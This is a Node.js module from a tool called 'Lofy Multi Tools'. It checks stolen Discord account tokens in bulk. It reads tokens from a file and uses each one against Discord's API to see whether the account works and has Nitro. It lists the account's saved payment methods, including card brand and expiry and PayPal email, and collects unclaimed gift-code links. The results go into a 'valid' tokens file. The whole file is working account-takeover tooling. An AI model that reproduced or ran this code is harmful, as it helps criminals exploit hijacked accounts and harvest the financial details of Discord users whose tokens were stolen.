module.exports.self = function () {
process.title = "Lofy Multi Tools - Token Checker"
const fetch = require("node-fetch"),
fs = require("fs"),
colors = require("colors"),
readline = require("readline").createInterface({input: process.stdin,output: process.stdout})
const token = fs.readFileSync("./Api/Token Checker/🤫Tokens.txt", "utf-8").replace(/\r/g, "").split("\n")
fs.writeFile(`./Api/Token Checker/Respostas/🎉Validos.txt`, "", (err, data) => {})
fs.writeFile(`./Api/Token Checker/Respostas/❌Invalidos.txt`, "", (err, data) => {})

async function start() {
   console.clear();

   console.log(`\n\n
   ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗     ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
   ╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║    ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
      ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║    ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
      ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║    ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
      ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║    ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
      ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝     ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
      \n\n`.magenta
   );

   for (i = 0; i < token.length; i++) {
      await sleep(500);
      check(token[i]);
   }
   
   await sleep(500);
   require('./Fim/index').acabou(2,"\n   [!] Todos os tokens foram verificados!\n   [1] Tentar novamente\n   [2] Sair".green,"",readline,"","","token-checker","")
   
}

async function sleep(time) {
    return new Promise(resolve => setTimeout(resolve, time));
}

async function check(token) {
   var nitro = `Sem nitro`;
   var pagamento = "";
   var res = await fetch(`https://discord.com/api/v8/users/@me/guilds`, {
      method: "GET",
      headers: {
         authorization: `${token}`,
         "content-type": "application/json",
      },
   })
      .then((resp) => resp.json())
      .catch(() => console.error);
   if (res.message === "401: Unauthorized") {
      console.log(`   [X] Token Invalido: ${token.yellow}`.red);
      return fs.appendFile(`./Api/Token Checker/Respostas/❌Invalidos.txt`, `[INVALIDO] ${token}\n`, (err, data) => {});
   }

   if (res.message === "You need to verify your account in order to perform this action.") {
      console.log(`   [!] A conta não e verificada: ${token.yellow}`.yellow);
      return fs.appendFile(`./Api/Token Checker/Respostas/❌Invalidos.txt`, `[CONTA SEM VERIFICAÇÃO] ${token}\n`, (err, data) => {});
   }

   var res2 = await fetch(`https://discord.com/api/v8/users/@me`, {
      method: "GET",
      headers: {
         authorization: `${token}`,
         "content-type": "application/json",
      },
   })
      .then((resp) => resp.json())
      .catch(() => console.error);

   if (res2.premium_type) {
      switch (res2.premium_type) {
         case 1:
            nitro = "Classic";
            break;
         case 2:
            nitro = "Gaming";
            break;
      }
   }

   var res3 = await fetch(`https://discord.com/api/v8/users/@me/billing/payment-sources`, {
      method: "GET",
      headers: {
         authorization: `${token}`,
         "content-type": "application/json",
      },
   }).then((resp) => resp.json());

   if (res3.length != 0) {
      await res3.map((a) => {
         switch (a.type) {
            case 1:
               pagamento += `[CC] Cartão: ${a.brand.toUpperCase()} | [VAL] ${a.expires_month}/${a.expires_year}`;
               break;
            case 2:
               pagamento += `[PP] Paypal: ${a.email}`;
               break;
         }
      });
   } else {
      pagamento = "   [X] Sem Método de Pagamento";
   }

   var res4 = await fetch(`https://discord.com/api/v8/users/@me/entitlements/gifts`, {
      method: "GET",
      headers: {
         authorization: `${token}`,
         "content-type": "application/json",
      },
   })
      .then((resp) => resp.json())
      .catch(() => console.error);

   if (res4.length === 0) {
      return darlog(`   [OK] Token Valido: ${token}\n   [!] Nitro: ${nitro}\n   [!] Metodo de Pagamento: ${pagamento}\n`);
   }

   await res4.map(async (a) => {
      if (a.sku_id) {
         gift(a.sku_id, a.subscription_plan.id);
      }
   });

   async function gift(sku_id, id) {
      var gift = ``;
      var res5 = await fetch(`https://discord.com/api/v8/users/@me/entitlements/gift-codes?sku_id=${sku_id}&subscription_plan_id=${id}`, {
         method: "GET",
         headers: {
            authorization: `${token}`,
            "content-type": "application/json",
         },
      })
         .then((resp) => resp.json())
         .catch(() => console.error);
      await res5.map((a) => {
         if (a.uses === 0) {
            gift += `https://discord.gift/${a.code} `;
         }
      });

      darlog(`   [OK] Token Valido ${token} | Discord Nitro: ${nitro} | Metodo de Pagamentos: ${pagamento}`);
   }

   async function darlog(message) {
      console.log(`${message}`.green);
      return fs.appendFile(`./Api/Token Checker/Respostas/🎉Validos.txt`, `${message}\n`, (err, data) => {});
   }
}
start();

}